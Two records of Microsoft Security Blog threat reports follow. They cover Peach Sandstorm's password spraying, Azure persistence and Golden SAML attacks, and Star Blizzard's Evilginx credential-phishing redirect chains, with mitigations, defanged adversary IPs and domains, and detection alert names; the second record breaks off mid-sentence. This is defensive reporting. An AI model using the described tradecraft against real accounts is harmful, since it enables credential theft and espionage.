{"id":64,"title":"Peach Sandstorm password spray campaigns enable intelligence collection at high-value targets | Microsoft Security Blog","publish_date":"2023-02-28","link":"https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-at-high-value-targets/","clean_text":"Since February 2023, Microsoft has observed password spray activity against thousands of organizations carried out by an actor we track as Peach Sandstorm (HOLMIUM).\nPeach Sandstorm is an Iranian nation-state threat actor who has recently pursued organizations in the satellite, defense, and pharmaceutical sectors around the globe.\nBased upon the profile of victim organizations targeted and the observed follow-on intrusion activity, Microsoft assesses that this initial access campaign is likely used to facilitate intelligence collection in support of Iranian state interests.\nIn cases where Peach Sandstorm successfully authenticated to an account, Microsoft observed the group using a combination of publicly available and custom tools for discovery, persistence, and lateral movement.\nIn a small number of intrusions, Peach Sandstorm was observed exfiltrating data from the compromised environment.\nGiven the volume of activity, ongoing attempts to access targets of interest, and risks associated with post-compromise activity, Microsoft is reporting on this campaign to raise awareness of recent Peach Sandstorm tradecraft and empower organizations to harden their attack surfaces and defend against this activity.\nAs with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised by Peach Sandstorm and provides them with the information they need to secure their accounts.\nWho is Peach Sandstorm?\nPeach Sandstorm is an Iranian nation-state group known to target organizations in multiple countries.\nIn past attacks, Peach Sandstorm has pursued targets in the aviation, construction, defense, education, energy, financial services, healthcare, government, satellite, and telecommunications sectors.\nActivity that Microsoft attributes to Peach Sandstorm overlaps with public reporting on groups known as APT33, Elfin, and Refined Kitten.\nThroughout 2023, Peach Sandstorm has consistently demonstrated interest in organizations in the satellite, defense, and to a lesser extent, pharmaceutical sectors.\nIn the initial phase of this campaign, Peach Sandstorm conducted password spray campaigns against thousands of organizations across several sectors and geographies.\nWhile Microsoft observed several organizations previously targeted by Peach Sandstorm, the volume of activity and range of organizations suggests that at least a subset of the initial activity is opportunistic.\nIn past operations, Peach Sandstorm relied heavily, but not exclusively, on password spray attacks as a means of gaining access to targets of interest.\nIn some cases, Peach Sandstorm has used this tradecraft to compromise an intermediate target and enable access to downstream environments.\nAs one example, Peach Sandstorm carried out a wave of attacks in 2019 that coincided with a rise in tensions between the United States and the Islamic Republic of Iran.\nUnlike password spray operations which are noisy by definition, a subset of Peach Sandstorm’s 2023 post-compromise activity has been stealthy and sophisticated.\nMany of the cloud-based tactics, techniques, and procedures (TTPs) seen in these most recent campaigns are materially more sophisticated than capabilities used by Peach Sandstorm in the past.\nIntrusion chain Microsoft observed Peach Sandstorm using two distinct sets of TTPs in the early stages of the intrusion lifecycle in 2023 attacks.\nIn later stages of known compromises, the threat actor used different combinations from a set of known TTPs to drop additional tools, move laterally, and ultimately exfiltrate data from a target.\nPath 1: Password spray activity, internal reconnaissance with AzureHound or Roadtools, and multiple persistence mechanisms Password spray activity Between February and July 2023, Peach Sandstorm carried out a wave of password spray attacks attempting to authenticate to thousands of environments.\nPassword spraying is a technique where threat actors attempt to authenticate to many different accounts using a single password or a list of commonly-used passwords.\nUnlike brute force attacks that target a single account using many passwords, password spray attacks help adversaries maximize their chances for success and minimize the likelihood of automatic account lockouts.\nEven a single compromised account could allow an adversary to conduct reconnaissance, move laterally, or access sensitive resources, often without attracting attention from defenders.\nLong-running password spray campaigns offer insight into adversaries’ pattern of life.\nActivity observed in this campaign aligned with an Iranian pattern of life, particularly in late May and June, where activity occurred almost exclusively between 9:00 AM and 5:00 PM Iran Standard Time (IRST).\nWhile Peach Sandstorm has carried out high-volume password spray campaigns in the past, elements of the most recent campaign were unique.\nSpecifically, Peach Sandstorm consistently conducted the password sprays from TOR IPs and used a “go-http-client” user agent.\nInternal reconnaissance with AzureHound or Roadtools In a small subset of instances where Peach Sandstorm successfully authenticated to an account in a targeted environment, Microsoft observed the threat actor using AzureHound or Roadtools to conduct reconnaissance in Microsoft Entra ID (formerly Azure Active Directory).\nIn this campaign, Peach Sandstorm used AzureHound, a Go binary that collects data from Microsoft Entra ID and Azure Resource Manager through the Microsoft Graph and Azure REST APIs, as a means of gathering information on a system of interest.\nSimilarly, Roadtools, a framework to access Microsoft Entra ID, allowed Peach Sandstorm to access data in a target’s cloud environment and conveniently dump data of interest to a single database.\nAzureHound and Roadtools have functionality that is used by defenders, red teams, and adversaries.\nThe same features that make these tools useful to legitimate users, like pre-built capabilities to explore and seamlessly dump data in a single database, also make these tools attractive options for adversaries seeking information about or from a target’s environment.\nMultiple persistence mechanisms In cases where Microsoft observed this particular intrusion chain, the threat actor used one or more persistence mechanisms.\nIn some cases, Peach Sandstorm created a new Azure subscription on a target’s tenant and/or leveraged previously compromised Azure resources.\nThese subscriptions were subsequently used to facilitate communication with Peach Sandstorm’s infrastructure.\nPeach Sandstorm also abused Azure Arc, a capability that allows users to secure, develop, and operate infrastructure, applications, and Azure services anywhere, to persist in compromised environments.\nIn this campaign, Peach Sandstorm installed the Azure Arc client on a device in the compromised environment and connected it to an Azure subscription controlled by Peach Sandstorm.\nThis effectively allowed Peach Sandstorm to control devices in a target’s on-premises environment from Peach Sandstorm’s cloud.\nPath 2: Remote exploitation of vulnerable internet-facing applications Initial access using remote exploitation In this wave of activity, Peach Sandstorm also attempted to exploit vulnerabilities with a public proof-of-concept (POC) in Zoho ManageEngine or Confluence, to access targets’ environments. -\nCVE-2022-47966 is a remote code execution vulnerability affecting a subset of on-premises Zoho ManageEngine products.\nMicrosoft recommends organizations using vulnerable applications patch this vulnerability as multiple groups have been observed exploiting this vulnerability. -\nCVE-2022-26134 is a remote code execution vulnerability in Confluence Server and Data Center.\nRecommendations that help organizations protect against exploitation of multiple vulnerabilities, including CVE-2022-26134, can be found in the recommendations section of this report.\nPost-compromise activity The following post-compromise activity affected organizations in the defense, satellite, and pharmaceutical sectors: - In a subset of intrusions in this campaign, Peach Sandstorm deployed AnyDesk, a commercial remote monitoring and management tool (RMM) to maintain access to a target.\nAnyDesk has a range of capabilities that allow users to remotely access a network, persist in a compromised environment, and enable command and control (C2).\nThe convenience and utility of a tool like AnyDesk is amplified by the fact that it might be permitted by application controls in environments where it is used legitimately by IT support personnel or system administrators. -\nIn a March 2023 intrusion, Peach Sandstorm conducted a Golden SAML attack to access a target’s cloud resources.\nIn a Golden SAML attack, an adversary steals private keys from a target’s on-premises Active Directory Federated Services (AD FS) server and use the stolen keys to mint a SAML token trusted by a target’s Microsoft 365 environment.\nIf successful, a threat actor could bypass AD FS authentication and access federated services as any user. -\nIn at least one intrusion, Microsoft observed Peach Sandstorm using a legitimate VMWare executable to carry out a search order hijack.\nDLL search order hijacking allows adversaries to introduce malicious code into an environment in a way that blends in with normal activity. -\nIn a handful of environments, Microsoft observed Peach Sandstorm using EagleRelay to tunnel traffic back to their infrastructure.\nIn these instances, Peach Sandstorm created a new virtual machine in a compromised Azure subscription.\nThese virtual machines were used to run EagleRelay, a custom tool, to tunnel traffic between actor-controlled systems and targets’ systems.\nIn at least one case, Microsoft also saw Peach Sandstorm attempting to move laterally in a compromised environment using remote desktop protocol (RDP).\nAdditional context The capabilities observed in this campaign are concerning as Microsoft saw Peach Sandstorm use legitimate credentials (gleaned from password spray attacks) to authenticate to targets’ systems, persist in targets’ environments, and deploy a range of tools to carry out additional activity.\nPeach Sandstorm also created new Azure subscriptions and leveraged the access these subscriptions provided to conduct additional attacks in other organizations’ environments.\nWhile the specific effects in this campaign vary based on the threat actor’s decisions, even initial access could adversely impact the confidentiality of a given environment.\nMicrosoft continues to work across its platforms to identify abuse, take down malicious activity, and implement new proactive protections to discourage malicious actors from using our services.\nWe encourage customers and the industry to report abuse.\nAs Peach Sandstorm increasingly develops and uses new capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these attacks.\nMicrosoft will continue to monitor Peach Sandstorm activity and implement robust protections for our customers.\nMitigations To harden an attack surface against Peach Sandstorm activity, defenders can implement the following: - Reset account passwords for any accounts targeted during a password spray attack.\nIf a targeted account had system-level permissions, further investigation may be warranted. -\nRevoke session cookies in addition to resetting passwords - Revoke any multifactor authentication (MFA) setting changes made by the attacker on any compromised users’ accounts - Require re-challenging MFA for MFA updates as the default - Implement the Azure Security Benchmark and general best practices for securing identity infrastructure, including: - Create conditional access policies to allow or disallow access to the environment based on defined criteria. -\nBlock legacy authentication with Microsoft Entra ID by using Conditional Access.\nLegacy authentication protocols don’t have the ability to enforce MFA, so blocking such authentication methods will prevent password spray attackers from taking advantage of the lack of MFA on those protocols. -\nEnable AD FS web application proxy extranet lockout to protect users from potential password brute force compromise. -\nSecure accounts with credential hygiene: - Practice the principle of least privilege and audit privileged account activity in your Microsoft Entra ID environments to slow and stop attackers. -\nDeploy Microsoft Entra ID Connect Health for Active Directory Federation Services (AD FS).\nThis captures failed attempts as well as IP addresses recorded in AD FS logs for bad requests in the Risky IP report. -\nUse Microsoft Entra ID password protection to detect and block known weak passwords and their variants. -\nTurn on identity protection in Microsoft Entra ID to monitor for identity-based risks and create policies for risky sign ins. -\nUse MFA to mitigate successful password spray attacks.\nKeep MFA always-on for privileged accounts and apply risk-based MFA for normal accounts. -\nConsider transitioning to a passwordless primary authentication method, such as Azure MFA, certificates, or Windows Hello for Business. -\nSecure RDP or Windows Virtual Desktop endpoints with MFA to harden against password spray or brute force attacks.\nSecuring critical assets like AD FS servers is a high-value measure to protect against golden SAML attacks.\nThe guidance provided below is applicable beyond just Peach Sandstorm activity and can help organizations harden their attack surfaces against a range of threats. -\nIt’s critical to treat your AD FS servers as a Tier 0 asset, protecting them with the same protections you would apply to a domain controller or other critical security infrastructure.\nAD FS servers provide authentication to configured relying parties, so an attacker who gains administrative access to an AD FS server can achieve total control of authentication to configured relying parties (include Microsoft Entra ID tenants configured to use the AD FS server). -\nPracticing credential hygiene, notably the recommendations provided above, is critical for protecting and preventing the exposure of highly privileged administrator accounts.\nThis especially applies on more easily compromised systems like workstations with controls like logon restrictions and preventing lateral movement to these systems with controls like the Windows Firewall. -\nMigration to Microsoft Entra ID (formerly Azure Active Directory) authentication is recommended to reduce the risk of on-premises compromises moving laterally to your authentication servers.\nCustomers can use the following references on migration: Indicators of compromise | Indicator | Type | Description | | 192.52.166[.]76 | IP address | Peach Sandstorm adversary IP | | 108.62.118[.]240 | IP address | Peach Sandstorm adversary IP | | 102.129.215[.]40 | IP address | Peach Sandstorm adversary IP | | 76.8.60[.]64 | IP address | Peach Sandstorm adversary IP | Detection details Microsoft Defender for Endpoint Alerts with the following titles in the security center can indicate Peach Sandstorm activity on your network: - Peach Sandstorm actor activity detected Microsoft Defender for Identity The following alerts might indicate activity associated with password spray campaigns. -\nPassword Spray - Atypical travel - Unfamiliar Sign-in properties Microsoft Defender for Cloud Apps The following alerts might indicate activity associated with password spray campaigns. -\nActivity from a Tor IP address - Suspicious Administrative Activity - Impossible travel activity - Multiple failed login attempts - Activity from a password-spray associated IP address Organizations with Defender for Cloud Apps can turn on app governance, a set of security and policy management capabilities designed for OAuth-enabled apps registered on Azure Active Directory, Google, and Salesforce.\nThe following detections in App governance might indicate activity associated with password spray campaigns. -\nNumerous Azure AD enumeration calls using PowerShell - Suspicious enumeration activities performed using AAD PowerShell Hunting queries Microsoft Sentinel Microsoft customers can use a range of Microsoft Sentinel content to help detect Peach Sandstorm activity described in this blog.\nThe Azure Active Directory solution contains several analytics rules and hunting queries for Microsoft Entra ID data that can help uncover initial access activity including password sprays.\nSpecific analytics rules of value include: - Password spray attack against Microsoft Entra ID application - Potential Password Spray Attack (Uses Authentication Normalization) - Okta – Potential Password Spray Attack References - https://www.cyberwarcon.com/apt33 - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html - https://github.com/dirkjanm/ROADtools - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-47966 - https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134 - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":94,"metadata":{"source":"blog","platform":"Microsoft","filename":"peach-sandstorm"}}
{"id":65,"title":"Star Blizzard increases sophistication and evasion in ongoing attacks | Microsoft Security Blog","publish_date":"2025-01-28","link":"https://www.microsoft.com/en-us/security/blog/2023/12/07/star-blizzard-increases-sophistication-and-evasion-in-ongoing-attacks/","clean_text":"January 2025 update – In mid-November 2024, Star Blizzard was observed shifting their tactics, techniques, and procedures (TTPs), likely in response to the exposure of their TTPs by Microsoft Threat Intelligence and other organizations.\nLearn more about our observations and findings in this Microsoft Threat Intelligence blog post: New Star Blizzard spear-phishing campaign targets WhatsApp accounts.\nOctober 2024 update – Microsoft’s Digital Crimes Unit (DCU) is disrupting the technical infrastructure used by Star Blizzard.\nWe have updated this blog with the latest observed Star Blizzard tactics, techniques, and procedures (TTPs).\nMicrosoft Threat Intelligence continues to track and disrupt malicious activity attributed to a Russian nation-state actor we call Star Blizzard.\nStar Blizzard has continuously improved their detection evasion capabilities while remaining focused on email credential theft against the same targets.\nStar Blizzard, whose activities we assess to have historically supported both espionage and cyber influence objectives, continues to prolifically target individuals and organizations involved in international affairs, defense, and logistics support to Ukraine, as well as academia, information security companies, and other entities aligning with Russian state interests.\nMicrosoft continues to refine and deploy protections against Star Blizzard’s evolving spear-phishing tactics.\nMicrosoft is grateful for the collaboration on investigating Star Blizzard compromises with the international cybersecurity community, including our partners at the UK National Cyber Security Centre, the US National Security Agency Cybersecurity Collaboration Center, and the US Federal Bureau of Investigation.\nThis blog provides updated technical information about Star Blizzard tactics, techniques, and procedures (TTPs), building on our 2022 blog as the threat actor continues to refine their tradecraft to evade detection.\nAs with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the necessary information to secure their accounts.\nStar Blizzard TTPs observed in 2024 Star Blizzard persistently introduces new techniques to avoid detection.\nThese TTPs are employed for brief periods and are either modified or abandoned once they become publicly known.\nMicrosoft has identified the following evasive techniques used by Star Blizzard in campaigns in 2024: - Use of multiple registrars to register domain infrastructure - Use of multiple link-shortening services and legitimate websites with open redirects, to hide actor-registered domains - Use of altered legitimate email templates as spear-phishing lures Using multiple registrars to register domain infrastructure In December 2023, we highlighted that Star Blizzard was using the registrar NameCheap to register their domain infrastructure.\nAs CitizenLab reported (August 2024), the threat actor has also used Hostinger to register domains used in the infrastructure for email credential theft.\nMicrosoft can confirm that in 2024 Star Blizzard transitioned from their long-standing practice of primarily using a single domain name registrar.\nAmong the registrars seen used by Star Blizzard in 2024 are the following: - Hostinger - RealTime Register - GMO Internet A list of recent domain names registered by Star Blizzard can be found at the end of this report.\nUse of multiple link-shortening services and legitimate websites to hide actor-registered domains Since August 2024, Star Blizzard has made substantial changes in the methods they employ to redirect targets to their virtual private server (VPS) infrastructure, on which Evilginx is installed and then used to facilitate credential theft.\nIn December 2023, we detailed the threat actor’s use of email marketing platforms to prevent the need to embed the actor-registered domains in their spear-phishing emails.\nThis technique was abandoned in early 2024, with the threat actor transitioning first to hosting the initial redirector website on shared infrastructure.\nSince August 2024, Star Blizzard has added multiple layers of redirection to their VPS infrastructure, utilizing various link-shortening services and legitimate websites that can be used as open redirectors.\nFor example, in a recent spear-phishing email that was sent from an actor-controlled Outlook account, we found that the threat actor had embedded an initial link, which was created using the Microsoft 365 Safe Links into the attached PDF lure.\nThe Safe Links URL could only be generated by sending an email between actor-controlled accounts with the link in the body.\nThe actor then copied that generated Safe Links URL to use in their attack.\nThis link redirected to a shortened URL created using the Bitly link-shortening service, which resolved to another shortened URL created using the Cuttly link-shortening service.\nThe second shortened URL redirected to a legitimate website, used as an open redirector, which ultimately redirected to the first actor-controlled domain.\nThe website mechengsys[.]net was hosted on shared infrastructure at Hostinger and performed various filtering actions until ultimately redirecting to an actor-controlled VPS installed with Evilginx, resolving the domain vidmemax[.]com.\nUse of altered legitimate email templates as spear-phishing lures For a brief period between July and August 2024, the threat actor utilized spear-phishing lures that did not contain or redirect to PDF lures embedded with links that redirected to actor-controlled infrastructure.\nInstead, Star Blizzard sent targets an altered OneDrive file share notification that included a clickable link to a malicious URL.\nWhen clicked, the link would initiate redirection to actor-controlled infrastructure.\nWe observed Star Blizzard using this approach in spear-phishing attacks against its traditional espionage targets, including individuals associated with politics and diplomacy, NGOs, and think tanks.\nIn this approach, the threat actor began by creating a new email account, usually a Proton account, intended to impersonate a trusted sender so the recipient would be more likely to open the phishing email.\nThe actor then stored a benign PDF or Word file in a cloud file-hosting service (for example, when targeting Microsoft customers, OneDrive) and shared the file with the newly created email account.\nThe threat actor edited the HTML of the email, changing the displayed sender name and the URL behind the “Open” button that would otherwise lead back to the OneDrive-hosted file so that it directed to the Evilginx redirector domain instead.\nStar Blizzard then sent the spear-phishing email to the target.\nWhen the “Open” button was clicked, it directed the user to the redirector domain, which, after performing filtering based on browser fingerprinting and additional methods, directed the target to an actor-controlled Virtual Private Server (VPS) with the Evilginx installation.\nThe Evilginx server allowed Star Blizzard to perform an adversary-in-the-middle (AiTM) attack on an authentication session to an email provider, enabling the actor to receive the necessary information to perform subsequent sign-ins to the target’s email account, including the username, password, and MFA token, if MFA is used by the target.\nTTPs used in past Star Blizzard campaigns Microsoft observed Star Blizzard using the following TTPs in campaigns before 2024, highlighting continuously evolving techniques used by the threat actor to evade detection: - Use of server-side scripts to prevent automated scanning of actor-controlled infrastructure - Use of email marketing platform services to hide true email sender addresses and obviate the need for including actor-controlled domain infrastructure in email messages - Use of a DNS provider to obscure the IP addresses of actor-controlled virtual private server (VPS) infrastructure.\nOnce notified, the DNS provider took action to mitigate actor-controlled domains abusing their service. -\nPassword-protected PDF lures or links to cloud-based file-sharing platforms where PDF lures are hosted - Shift to a more randomized domain generation algorithm (DGA) for actor-registered domains Use of server-side scripts to prevent automated scanning Between April 2023 and December 2023, we observed Star Blizzard gradually moving away from using hCaptcha servers as the sole initial filter to prevent automatic scanning of their Evilginx server infrastructure.\nRedirection was still performed by an actor-controlled server, first executing JavaScript code (titled “Collect and Send User Data”) before redirecting the browsing session to the Evilginx server.\nShortly after, in May 2023, the threat actor was observed refining the JavaScript code, resulting in an updated version (titled “Docs”), which is still in use today.\nThis capability collects various information from the browser performing the browsing session to the redirector server.\nThe code contains three main functions: - pluginsEmpty(): This function checks if the browser has any plugins installed. -\nisAutomationTool(): This function checks for various indicators that the page is being accessed by an automation tool (such as Selenium, PhantomJS, or Nightmare) and returns an object with information about the detected tools. -\nsendToBackend(data): This function sends the data collected by isAutomationTool() to the server using a POST request.\nIf the server returns a response, the message in the response is executed using eval().\nFollowing the POST request, the redirector server assessed the data collected from the browser and decided whether to allow continued browser redirection.\nWhen a good verdict is reached, the browser received a response from the redirection server, redirecting to the next stage of the chain, which is either an hCaptcha for the user to solve, or direct to the Evilginx server.\nA bad verdict resulted in the receipt of an HTTP error response and no further redirection.\nUse of email marketing platform services We previously observed Star Blizzard using two different services, HubSpot and MailerLite.\nThe actor used these services to create an email campaign, which provided them with a dedicated subdomain on the service that is then used to create URLs.\nThese URLs acted as the entry point to a redirection chain ending at actor-controlled Evilginx server infrastructure.\nThe services also provided the user with a dedicated email address per configured email campaign, which the threat actor has been seen to use as the “From” address in their campaigns.\nMost Star Blizzard HubSpot email campaigns have targeted multiple academic institutions, think tanks, and other research organizations using a common theme, aimed at obtaining their credentials for a US grants management portal.\nWe assess that this use-case of the HubSpot mailing platform was to allow the threat actor to track large numbers of identical messages sent to multiple recipients.\nNote should be taken to the “Reply-to” address in these emails, which is required by the HubSpot platform to be an actual in-use account.\nAll the sender accounts in the following examples were dedicated threat actor-controlled accounts.\nOther HubSpot campaigns have been observed using the campaign URL embedded in an attached PDF lure or directly in the email body to perform redirection to actor-controlled Evilginx server infrastructure configured for email account credential theft.\nWe assess that in these cases, the HubSpot platform was used to remove the need for including actor-controlled domain infrastructure in the spear-phishing emails and better evade detection based on indicators of compromise (IOC).\nStar Blizzard’s use of the MailerLite platform is similar to the second HubSpot tactic described above, with the observed campaign URL redirecting to actor-controlled infrastructure purposed for email credential theft.\nUse of a DNS provider to resolve actor-controlled domain infrastructure In December 2022, we began to observe Star Blizzard using a domain name service (DNS) provider that also acts as a reverse proxy server to resolve actor-registered domain infrastructure.\nAs of May 2023, most Star Blizzard registered domains associated with their redirector servers use a DNS provider to obscure the resolving IP addresses allocated to their dedicated VPS infrastructure.\nWe have yet to observe Star Blizzard utilizing a DNS provider to resolve domains used on Evilginx servers.\nPassword-protected PDF lures or links to cloud-based file-sharing platforms Star Blizzard has been observed sending password-protected PDF lures in an attempt to evade email security processes implemented by defenders.\nThe threat actor usually sends the password to open the file to the targeted user in the same or a subsequent email message.\nIn addition to password-protecting the PDF lures themselves, the actor has been observed hosting PDF lures at a cloud storage service and sharing a password-protected link to the file in a message sent to the intended victim.\nWhile Star Blizzard frequently uses cloud storage services from all major providers (including Microsoft OneDrive), Proton Drive is predominantly chosen for this purpose.\nMicrosoft suspends Star Blizzard operational accounts discovered using our platform for their spear-phishing activities.\nRandomizing DGA for actor registered domains Following the detailed public reporting by Recorded Future (August 2023) on detection opportunities for Star Blizzard domain registrations, we have observed the threat actor making significant changes in their chosen domain naming syntax.\nPrior to the public reporting, Star Blizzard utilized a limited wordlist for their DGA.\nSubsequently, Microsoft has observed that the threat actor has upgraded their domain-generating mechanism to include a more randomized list of words.\nDespite the increased randomization, Microsoft has identified detection opportunities based on the following constant patterns in Star Blizzard domain registration behavior: - Namecheap remains the registrar of choice - Domains are usually registered in groups, many times with similar naming conventions - X.509 TLS certificates are provided by Let’s Encrypt, created in the same timeframe of domain registration A list of recent domain names registered by Star Blizzard can be found at the end of this report.\nConsistent TTPs since 2022 Star Blizzard activities remain focused on email credential theft, predominantly targeting cloud-based email providers that host organizational and/or personal email accounts.\nStar Blizzard continues to utilize the publicly available Evilginx framework to achieve their objective, with the initial access vector remaining to be spear-phishing via email.\nTarget redirection to the threat actor’s Evilginx server infrastructure is still usually achieved using custom-built PDF lures that open a browser session.\nThis session follows a redirection chain ending at actor-controlled Evilginx infrastructure that is configured with a “phishlet” for the intended targets’ email provider.\nStar Blizzard remains constant in their use of pairs of dedicated VPSs to host actor-controlled infrastructure (redirector + Evilginx servers) used for spear-phishing activities, where each server usually hosts a separate actor registered domain.\nProtecting yourself against Star Blizzard As with all threat actors that focus on phishing or spear-phishing to gain initial access to victim mailboxes, individual email users should be aware of who these attacks target and what they look like to improve their ability to identify and avoid further attacks.\nThe following are a list of answers to questions that enterprise and consumer email users should be asking about the threat from Star Blizzard: Am I at risk of being a Star Blizzard target?\nUsers and organizations are more likely to be a potential Star Blizzard target if connected to the following areas: - Government or diplomacy (both incumbent and former position holders). -\nResearch into defense policy or international relations when related to Russia. -\nAssistance to Ukraine related to the ongoing conflict with Russia.\nRemember that Star Blizzard targets both consumer and enterprise accounts, so there is an equal threat to both organization and personal accounts.\nWhat will a Star Blizzard spear-phishing email look like?\nStar Blizzard emails appear to be from a known contact that users or organizations expect to receive email from.\nThe sender address could be from any free email provider, but special attention should be paid to emails received from Proton account senders (@proton[.]me, @protonmail[.]com) as they are frequently used by the threat actor.\nAn initial email is usually sent to the target, asking them to review a document, but without any attachment or link to the document.\nThe threat actor will wait for a response, and following that, will send an additional message with either an attached PDF file or an embedded link, as detailed above in “Star Blizzard TTPs observed in 2024.”\nIf the targeted user has not completed authentication by entering their password in the offered sign-in page and/or supplied all the required factors for multifactor authentication (MFA), the threat actor does not have the capability to successfully compromise the targeted account.\nOur recommendation to all email users that belong to Star Blizzard targeted sectors is to always remain vigilant when dealing with email, especially emails containing links to external resources.\nWhen in doubt, contact the person you think is sending the email using a known and previously used email address, to verify that the email was indeed sent by them.\nWhat happens if I interact with a Star Blizzard PDF lure?\nPressing the button in a PDF lure causes the default browser to open a link embedded in the PDF file code—this is the beginning of the redirection chain.\nTargets will likely see a web page titled “Docs” in the initial page opened and may be presented with a CAPTCHA to solve before continuing the redirection.\nThe browsing session will end showing a sign-in screen to the account where the spear-phishing email was received, with the targeted email already appearing in the username field.\nThe host domain in the web address is an actor-controlled domain (see appendix for full list), and not the expected domain of the email server or cloud service.\nIf multifactor authentication is configured for a targeted email account, entering a password in the displayed sign-in screen will trigger an authentication approval request.\nIf passwordless access is configured for the targeted account, an authentication approval request is immediately received on the device chosen for receiving authentication approvals.\nAs long as the authentication process is not completed (a valid password is not entered and/or an authentication request is not approved), the threat actor has not compromised the account.\nIf the authentication process is completed, the credentials have been successfully compromised by Star Blizzard, and the threat actor has all the required details needed to immediately access the mailbox, even if multifactor authentication is enabled.\nRecommendations As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the necessary information to secure their accounts.\nMicrosoft emphasizes that the following two mitigations will strengthen customers’ environments against Star Blizzard attack activity: - Using phishing resistant authentication methods. -\nLockdown account access using Conditional Access policies Microsoft is sharing indicators of compromise related to this attack at the end of this report to encourage the security community to further investigate for potential signs of Star Blizzard activity using their security solution of choice.\nAll these indicators have been incorporated into the threat intelligence feed that powers Microsoft Defender products to aid in protecting customers and mitigating this threat.\nIf your organization is a Microsoft Defender for Office customer or a Microsoft Defender for Endpoint customer with network protection turned on, no further action is required to mitigate this threat presently.\nA thorough investigation should be performed to understand potential historical impact if Star Blizzard activity has been previously alerted on in the environment.\nAdditionally, Microsoft recommends the following mitigations to reduce the impact of this threat: - Use advanced anti-phishing solutions like Microsoft Defender for Office 365 that monitor and scan incoming emails and visited websites.\nFor example, organizations can leverage web browsers that automatically identify and block malicious websites and provide solutions that detect and block malicious emails, links, and files. -\nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat, or when Microsoft Defender Antivirus is running in passive mode.\nEDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-compromise. -\nConfigure investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. -\nTurn on cloud-delivered protection and automatic sample submission in Microsoft Defender Antivirus to cover rapidly evolving attacker tools, techniques, and behaviors.\nThese capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. -\nUse security defaults as a baseline set of policies to improve identity security posture.\nFor more granular control, enable conditional access policies.\nConditional access policies evaluate sign-in requests using additional identity driven signals like user or group membership, IP location information, and device status, among others, and are enforced for suspicious sign-ins.\nOrganizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as compliant devices or trusted IP address requirements. -\nImplement continuous access evaluation. -\nContinuously monitor suspicious or anomalous activities.\nInvestigate sign-in attempts with suspicious characteristics (for example, location, ISP, user agent, and use of anonymizer services). -\nConfigure Microsoft Defender for Office 365 to recheck links on click.\nSafe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Office 365 applications such as Teams, and other locations such as SharePoint Online.\nSafe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Exchange Online Protection (EOP).\nSafe Links scanning can help protect your organization from malicious links that are used in phishing and other attacks. -\nUse the Attack Simulator in Microsoft Defender for Office 365 to organize realistic, yet safe, simulated phishing and password attack campaigns in your organization by training end users against clicking URLs in unsolicited messages and disclosing their credentials.\nTraining should include checking for poor spelling and grammar in phishing emails or the application’s consent screen as well as spoofed app names, logos, and domain URLs appearing to originate from legitimate applications or companies.\nNote that Attack Simulator testing only supports phishing emails containing links at this time. -\nEncourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware.\nIn all web protection scenarios, SmartScreen and Network Protection can be used together to ensure protection across both Microsoft and non-Microsoft browsers and processes. -\nMicrosoft Defender customers can turn on attack surface reduction rules to prevent common attack techniques: - Block executable files from running unless they meet a prevalence, age, or trusted list criterion. -\nBlock execution of potentially obfuscated scripts.\nAppendix Microsoft Defender XDR detections Microsoft Defender for Office 365 Microsoft Defender for Office 365 offers enhanced solutions for blocking and identifying malicious emails.\nSignals from Microsoft Defender for Office 365 inform Microsoft 365 Defender, which correlate cross-domain threat intelligence to deliver coordinated defense, when this threat has been detected.\nThese alerts, however, can be triggered by unrelated threat activity.\nExample alerts: - A potentially malicious URL click was detected - Email messages containing malicious URL removed after delivery - Email messages removed after delivery - Email reported by user as malware or phish Microsoft Defender SmartScreen Microsoft Defender SmartScreen has implemented detections against the phishing domains represented in the IOC section below.\nBy enabling Network protection, organizations can block attempts to connect to these malicious domains.\nMicrosoft Defender for Endpoint Aside from the Microsoft Defender for Office 365 alerts above, customers can also monitor for the following Microsoft Defender for Endpoint alerts for this attack.\nNote that these alerts can also be triggered by unrelated threat activity.\nExample alerts: - Star Blizzard activity group - Suspicious URL clicked - Suspicious URL opened in web browser - User accessed link in ZAP-quarantined email - Suspicious activity linked to a Russian state-sponsored threat actor has been detected - Connection to adversary-in-the-middle (AiTM) phishing site - User compromised in AiTM phishing attack - Possible AiTM phishing attempt Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog.\nThese reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, and respond to associated threats found in customer environments.\nMicrosoft Defender Threat Intelligence - Star Blizzard - Disrupting Star Blizzard’s ongoing phishing operations - Star Blizzard adopting PDF-less approach to spearphishing - Star Blizzard spearphishing campaign targets US think tanks Microsoft Defender for Endpoint Threat analytics Hunting queries Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub 